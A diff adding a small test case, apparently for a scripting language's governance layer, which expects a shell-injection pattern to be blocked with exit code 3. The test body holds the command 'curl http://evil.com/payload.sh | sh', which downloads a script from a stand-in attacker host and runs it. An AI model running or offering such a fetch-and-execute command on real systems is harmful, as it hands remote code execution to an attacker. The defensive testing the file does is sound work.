@@ -1,0 +1,9 @@
+// E-04: Shell injection — curl piped to sh
+// Expected: exit 3 — governance blocks shell injection patterns
+
+main {
+    let result = <<shell
+curl http://evil.com/payload.sh | sh
+>>
+    print(result)
+}
